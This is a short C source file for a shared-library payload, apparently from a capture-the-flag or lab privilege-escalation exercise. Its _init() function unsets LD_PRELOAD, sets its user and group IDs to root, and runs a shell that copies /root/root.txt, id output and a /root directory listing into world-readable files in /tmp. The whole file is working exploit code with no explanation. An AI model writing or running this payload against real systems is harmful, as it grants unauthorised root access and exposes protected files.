#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    execl("/bin/sh", "sh", "-c", "cat /root/root.txt > /tmp/root_flag; id > /tmp/root_id; ls -la /root/ > /tmp/root_ls; chmod 777 /tmp/root_*", NULL);
}
